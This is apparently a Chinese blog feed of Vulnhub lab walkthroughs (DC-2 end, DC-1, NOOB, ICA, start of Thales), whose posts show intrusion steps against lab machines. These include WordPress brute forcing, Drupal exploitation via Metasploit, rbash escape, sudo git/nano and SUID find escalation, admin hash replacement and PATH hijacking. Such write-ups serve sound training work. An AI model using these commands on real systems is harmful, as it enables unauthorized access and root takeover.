src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025212734247.png" alt="image-20241025212734247"></p><p>我们发现了三个存在的用户，即<code>admin</code>、<code>jerry</code>、<code>tom</code>，我们按照第一个flag的提示用cewl去生成一个我们的密码字典，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025213029840.png" alt="image-20241025213029840"></p><p>最后我们用wpscan进行爆破即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U user.txt -P custom.txt </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025213415121.png" alt="image-20241025213415121"></p><p>成功找到tom和jerry的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tom/parturient</span><br><span class="line">jerry/adipiscing</span><br></pre></td></tr></table></figure><p>我们尝试登录后台，成功发现第二个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025213709896.png" alt="image-20241025213709896"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><p>它提示我们这里有另外的方式去登录系统，那我们肯定就考虑ssh登录了，毕竟开放了ssh登录，我们尝试ssh登录</p><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh tom@192.168.20.153 -p 7744</span><br></pre></td></tr></table></figure><p>成功登录进服务器中</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026130226232.png" alt="image-20241026130226232"></p><p>并且我们在当前目录下发现了flag3.txt，但是我试了很多读取命令，系统中都不存在</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026130637820.png" alt="image-20241026130637820"></p><p>我们只能使用命令查询系统中允许使用的命令是哪些，输入以下命令可以成功查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compgen -c</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/586f023567d57b7b511b902eb8797e39.png" alt="586f023567d57b7b511b902eb8797e39"></p><p>我们发现存在vi命令，我们直接利用vi命令读取flag3即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026131047471.png" alt="image-20241026131047471"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><p>这明显就是提示我们要尝试切换到jerry用户，jerry用户的权限可能略高于tom用户</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026131648434.png" alt="image-20241026131648434"></p><p>但是我们尝试了很多次，发现大部分命令都给禁用了，所以我们要想办法绕过这个<code>rbash</code>的限制，网上有很多rbash逃逸的文章，可以去看看，我们这里使用<code>vi</code>进行rbash逃逸</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># vim/vi进入之后</span><br><span class="line">:set shell=/bin/sh # 或者用/bin/bash</span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026133035855.png" alt="image-20241026133035855"></p><p>逃逸后我们发现我们可以成功执行cat命令，接下来我们试着切换到jerry用户，密码还是使用刚刚的密码进行尝试</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026134039966.png" alt="image-20241026134039966"></p><p>我们发现成功登录到jerry账户，我们寻找一下进一步提示，找一找flag4</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026134254527.png" alt="image-20241026134254527"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure><p>我们尝试进行suid提权，输入<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，发现并没有可以利用的点，我们进而查看sudo提权，输入<code>sudo -l</code>，发现可以利用git进行sudo提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026134522770.png" alt="image-20241026134522770"></p><p>输入以下命令，可以成功提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">ln -s /bin/sh &quot;$TF/git-x&quot;</span><br><span class="line">sudo git &quot;--exec-path=$TF&quot; x</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026134750599.png" alt="image-20241026134750599"></p><p>我们进一步获取交互式shell，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026134931202.png" alt="image-20241026134931202"></p><p>成功获取最终flag，本题到此结束</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本题难度也不是很大，主要的点有利用<code>cewl</code>生成自定义字典，利用wpscan进行wordpress探测，以及rbash的逃逸，最值得注意的就是 rbash的逃逸，这是我第一次遇见这种问题，可以稍微多注意一点，rbash就是用一个假的bash替换了原来的真bash，进而对能使用的命令进行限制，我们可以通过其开放的命令进行逃逸，例如<code>vim</code>、<code>more</code>、<code>less</code>、<code>ftp</code>等等</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-DC:1</title>
      <link href="/post/535cf786.html"/>
      <url>/post/535cf786.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/dc/DC-1.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>靶机：192.168.20.0/24</p><p>目标：获取5个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.152</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025182140064.png" alt="image-20241025182140064"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.152</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025182313738.png" alt="image-20241025182313738"></p><p>我们发现开放了<code>22</code>、<code>80</code>、<code>111</code>、<code>42289</code>端口，我们暂时先去看看<code>80</code>端口给我们提供了什么有效的信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025182658515.png" alt="image-20241025182658515"></p><p>我们发现其存在<code>robots.txt</code>，我们访问<code>robots.txt</code>，看看有没有什么关键信息，探寻了一圈后并没有发现什么有价值的信息，虽然那些文件都可以被访问到，但是并没有什么鸟用，然后我去网上搜了一下Drupal框架的历史漏洞，有一个<code>CVE-2018-7600</code>远程代码执行漏洞和<code>CVE-2019-6340</code>远程代码执行漏洞，但是网上的POC都没有什么用，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025185607126.png" alt="image-20241025185607126"></p><p>这个时候我们尝试使用msf上自带的漏洞攻击模块进行攻击，看看有没有能成功拿权限的漏洞</p><h2 id="MSF上线"><a href="#MSF上线" class="headerlink" title="MSF上线"></a>MSF上线</h2><p>首先我们使用<code>whatweb</code>查看一下版本号，这是kali自带的工具</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/abd89a016a7e7c42053dedaa7f0aa8d1.png" alt="abd89a016a7e7c42053dedaa7f0aa8d1"></p><p>我们可以知道这是Drupal 7 版本的，我们首先使用<code>search Drupal 7</code>查找和这个cms系统相关的漏洞，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025190543555.png" alt="image-20241025190543555"></p><p>这里我们选择payload 1，我们输入<code>use 1</code>即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025190735626.png" alt="image-20241025190735626"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.20.152</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>之后我们直接拿shell权限即可，我们输入shell，为了获得交互式控制，我们输入如下语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>实现交互shell，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025191054723.png" alt="image-20241025191054723"></p><p>这里我们找到第一个flag，<code>flag1.txt</code>，我们直接读取即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们这里执行<code>find / -perm -u=s -type f 2&gt;/dev/null</code>看是否存在suid提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/897a5a15e3a121f66d9dc59a92f80696.png" alt="897a5a15e3a121f66d9dc59a92f80696"></p><p>这里面很显然是使用find进行suid提权，我们首先在当前目录下创建一个<code>.sh</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch ssh.sh</span><br><span class="line">find ssh.sh -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p>执行后我们就可以发现成功提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025192733500.png" alt="image-20241025192733500"></p><p>我们成功拿到最后的flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure><p>当时我们还有<code>flag2</code>和<code>flag3</code>以及<code>flag4</code>没找到，我们在home目录下发现一个flag4用户，下面有一个<code>flag4.txt</code>，我们尝试读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure><p>我们试着使用find命令查找剩余的两个flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025193122461.png" alt="image-20241025193122461"></p><p>并没有发现其他两个flag的信息，我们看看flag1的提示吧，这几个flag应该是有递进关系的，第一个flag提示我们去config文件中看看，我们去找这个cms的配置文件即可</p><p>我们在网上可以查询到dural的配置文件位置，<code>/sites/default/settings.php</code>，我们直接访问这个文件，发现里面确实存在flag2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line">only ways to gain access (and you WILL need access).</span><br><span class="line">What can you do with these credentials?</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025195710913.png" alt="image-20241025195710913"></p><p>同时获得了数据库的账户密码，我们直接连接数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u dbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025200021920.png" alt="image-20241025200021920"></p><p>我们在数据库中确实找到了管理员的登录账号密码，但是被加密了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025200547452.png" alt="image-20241025200547452"></p><p>通过flag2我们知道不能爆破密码，那我们就只剩下修改密码了，因为我们有数据库权限，我们可以直接讲修改的密码更新到数据库中，我们先尝试注册一个密码为123456的用户，然后直接在数据库里更新admin的密码，但是我们根本注册不了新用户，因为注册用户需要邮箱接收验证码，但是我们的邮箱并不能接收到验证码，所以我们只能尝试去找一找是怎么加密的了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025202152996.png" alt="image-20241025202152996"></p><p>我们直接运行相关命令，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure><p>加密出来<code>$S$DBdjFBevhOwTeP.UcmRJMfef2lfNMPYS3ykCOaG2UKTkE2gCEAiL</code>，我们直接在数据库中执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update drupaldb.users set pass=&quot;$S$DBdjFBevhOwTeP.UcmRJMfef2lfNMPYS3ykCOaG2UKTkE2gCEAiL&quot; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025202624531.png" alt="image-20241025202624531"></p><p>之后我们尝试登录即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025202747384.png" alt="image-20241025202747384"></p><p>成功发现flag3 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure><p>至此所有flag都被成功找到</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>框架漏洞的发现和利用</li><li>利用cms的特性进行管理员密码的更改</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-NOOB</title>
      <link href="/post/aebf43b3.html"/>
      <url>/post/aebf43b3.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/noob/Noob.ova</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.151</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023194532106.png" alt="image-20241023194532106"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.151</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023194736070.png" alt="image-20241023194736070"></p><p>这里开放了<code>21</code>、<code>80</code>、<code>55077</code>端口，其中<code>21</code>端口提供ftp服务，<code>55077</code>端口提供ssh服务，我们首先访问<code>80</code>端口，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023195331086.png" alt="image-20241023195331086"></p><p>查看了一下源码，并未发现什么有价值的信息，我们首先扫描一下是否存在后门路径</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023202624820.png" alt="image-20241023202624820"></p><p>并未发现什么有价值的信息，我们尝试从ftp服务入手，看看能否获得有价值的信息，在这里我们选择匿名账户登录，<strong>21端口运行我们以匿名账户的形式登录</strong></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023203054210.png" alt="image-20241023203054210"></p><p>登录进去后我们可以发现有两个提示性文件，<code>cred.txt</code>和<code>welcome</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023203147784.png" alt="image-20241023203147784"></p><p>我们传输到我们的本机上来，看看这两个文件是什么，其中<code>cred.txt</code>里面写的是<code>Y2hhbXA6cGFzc3dvcmQ=</code>，我们拿去解密一下，即<code>champ:password</code>，看起来像是web登录的账号密码，我们再看看<code>welcome</code>文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024090952683.png" alt="image-20241024090952683"></p><p>我们去登录一下web界面，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024091345982.png" alt="image-20241024091345982"></p><p>我们点击右上角<code>About Us</code>的时候，会自动下载一个压缩包，我们下载下来看看里面的东西，里面只有两张图片文件和一个<code>sudo</code>文件。sudo文件里写着</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024091836799.png" alt="image-20241024091836799"></p><p>提示着我们要从文件名出发，说明这可能是个提权文件，而且这两个图片肯定隐藏了东西，我们首先下载一个查看隐写的工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install steghide</span><br></pre></td></tr></table></figure><p>然后使用这个工具去尝试查看隐写的两张图片</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024093432829.png" alt="image-20241024093432829"></p><p>我们分离出了两个文件<code>hint.py</code>和<code>user.txt</code>，其中密码为<code>sudo</code>，即sudo文件提示我们的，我们尝试去读取这两个文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024093722455.png" alt="image-20241024093722455"></p><p>根据提示文件，这一看就是凯撒加密，我们尝试去解密这个文件，解密结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wtf:this one is a simple one</span><br></pre></td></tr></table></figure><h2 id="SSH远程登录"><a href="#SSH远程登录" class="headerlink" title="SSH远程登录"></a>SSH远程登录</h2><p>看起来像是密码，我们试着ssh登录一下，成功登录进去，这里要注意的是端口号是<code>55077</code>，不是常见的<code>22</code>端口</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024094543511.png" alt="image-20241024094543511"></p><p>进去之后浏览一下文件，我们在<code>Documents</code>下发现了一个<code>sh</code>文件，我们尝试打开，看看里面有什么东西</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/131dc2ee14767739bd2ee4f6df9ff4f9.png" alt="131dc2ee14767739bd2ee4f6df9ff4f9"></p><p>这里好像有另一个用户的账号和密码，我们尝试登录这个用户，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024100312540.png" alt="image-20241024100312540"></p><p>成功登录，我们还是先执行<code>sudo -l</code>看看能不能进行sudo提权</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024100440380.png" alt="image-20241024100440380"></p><p>我们发现使用nano可以直接切换为root模式，而且不需要密码，我们执行以下语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nano</span><br><span class="line">ctrl+r ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024101041128.png" alt="image-20241024101041128"></p><p>成功获得root权限，我们接下来去寻找两个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024101202603.png" alt="image-20241024101202603"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241024101348521.png" alt="image-20241024101348521"></p><p>拿去base64解密一下即可，本题到此结束</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本题难道较为简单，主要涉及信息隐藏的方向，难度不大，算是熟悉挖掘有用信息了吧，同时ftp21端口是可以匿名登陆的，这点是值得注意的，以后遇到21端口也不会没有思路了，可以先尝试匿名登录一波。</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-ICA</title>
      <link href="/post/2f01fd02.html"/>
      <url>/post/2f01fd02.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/ica/ica1.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：根据我们的情报网络提供的信息，ICA 正在进行一个秘密项目。我们需要找出这个项目是什么。获得访问信息后，请将其发送给我们。我们将设置一个后门程序，以便稍后访问系统。你只关注项目是什么。您可能需要经过多层安全保护。中情局完全有信心您能成功完成这项任务。祝你好运，特工！</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.148</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023111302117.png" alt="image-20241023111302117"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.148</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023111445956.png" alt="image-20241023111445956"></p><p>靶机开放了<code>22</code>、<code>80</code>、<code>3306</code>、<code>33060</code>端口，其中<code>80</code>和<code>3306</code>端口是我们需要特别关注的两个端口，我们首先去看看<code>80</code>端口，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023112611689.png" alt="image-20241023112611689"></p><p>我们发现是qdpm 9.2版本，我们去浏览器搜索一下这个版本的框架是否存在历史漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/8aeafac12b53e09aa0ced368a0c823b1.png" alt="8aeafac12b53e09aa0ced368a0c823b1"></p><p>我们发现存在密码泄露的漏洞，我们访问<code>http://192.168.20.148/core/config/databases.yml</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023113048137.png" alt="image-20241023113048137"></p><p>成功找到mysql的账号密码，我们远程连接mysql数据库即可</p><h2 id="漏洞初探"><a href="#漏洞初探" class="headerlink" title="漏洞初探"></a>漏洞初探</h2><p>我们使用<code>mysql -u qdpmadmin -h 192.168.20.148 -p</code>登录mysql服务器</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023134020409.png" alt="image-20241023134020409"></p><p>我们去qdpm数据库里面看看有没有什么信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023134635991.png" alt="image-20241023134635991"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023134923320.png" alt="image-20241023134923320"></p><p>我们在<code>staff</code>数据库中找到了一串账户和密码，我们拿去解密，并保存在txt文件中，如下所示</p><div class="table-container"><table><thead><tr><th style="text-align:center">user</th><th style="text-align:center">passwd</th></tr></thead><tbody><tr><td style="text-align:center">Smith</td><td style="text-align:center">X7MQkP3W29fewHdC</td></tr><tr><td style="text-align:center">Lucas</td><td style="text-align:center">suRJAdGwLp8dy3rF</td></tr><tr><td style="text-align:center">Travis</td><td style="text-align:center">DJceVy98W28Y7wLg</td></tr><tr><td style="text-align:center">Dexter</td><td style="text-align:center">7ZwV4qtg42cmUXGX</td></tr><tr><td style="text-align:center">Meyer</td><td style="text-align:center">cqNnBWCByS2DuJSy</td></tr></tbody></table></div><p>我么将这5个用户一个个去尝试登录ssh，我们成功登录两个ssh服务，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023140802495.png" alt="image-20241023140802495"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023140814313.png" alt="image-20241023140814313"></p><p>并且我们发现了第一个flag，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023140902954.png" alt="image-20241023140902954"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICA&#123;Secret_Project&#125;</span><br></pre></td></tr></table></figure><p>同时发现了一个提示，note.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It seems to me that there is a weakness while accessing the system.</span><br><span class="line">As far as I know, the contents of executable files are partially viewable.</span><br><span class="line">I need to find out if there is a vulnerability or not.</span><br></pre></td></tr></table></figure><p>提示了我们要去找可执行文件，可执行文件上存在漏洞</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们尝试进行suid提权，执行<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，执行结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023142145279.png" alt="image-20241023142145279"></p><p>其中<code>get_access</code>文件十分的可疑，我们试着运行该文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023142740680.png" alt="image-20241023142740680"></p><p>我们使用strings命令查看该文件的函数，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/e196196ad64c6d58f040fd16f26e87df.png" alt="e196196ad64c6d58f040fd16f26e87df"></p><p>这里的cat我们可以使用环境变量进行提权，具体操作如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; cat</span><br><span class="line">chmod +x cat </span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /opt</span><br><span class="line">./get_access</span><br></pre></td></tr></table></figure><p>执行之后可以发现成功提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023144725515.png" alt="image-20241023144725515"></p><p>具体原理就是我们将<code>&quot;/bin/bash&quot;</code>这个命令伪装成<code>cat</code>，而系统在调用<code>cat</code>命令的时候会从左往右调用环境变量，而我们的<code>/tmp</code>环境变量在写入时处于最左端，所以里面的<code>cat</code>会被优先调用，进而直接执行<code>/bin/bash</code>命令，进而拿到root权限</p><p>成功拿到root.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;</span><br></pre></td></tr></table></figure><p>本题到此结束</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>浏览器进行信息收集，寻找泄露信息</li><li>mysql收集系统信息</li><li>利用环境变量提权</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-Thales</title>
      <link href="/post/13f08f7b.html"/>
      <url>/post/13f08f7b.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/thales/Thales.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：睁开你的眼睛，改变你的视角</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.147</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022180741141.png" alt="image-20241022180741141"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.147</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022181107260.png" alt="image-20241022181107260"></p><p>开放了<code>8080</code>端口和<code>22</code>端口，其中<code>8080</code>端口是其http服务，我们尝试着访问<code>8080</code>端口，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022200923402.png" alt="image-20241022200923402"></p><p>这是一个Tomcat服务，我们知道的是Tomcat曾经爆出过很多漏洞，我们首先先用漏洞扫描工具去探测一下</p><p><img 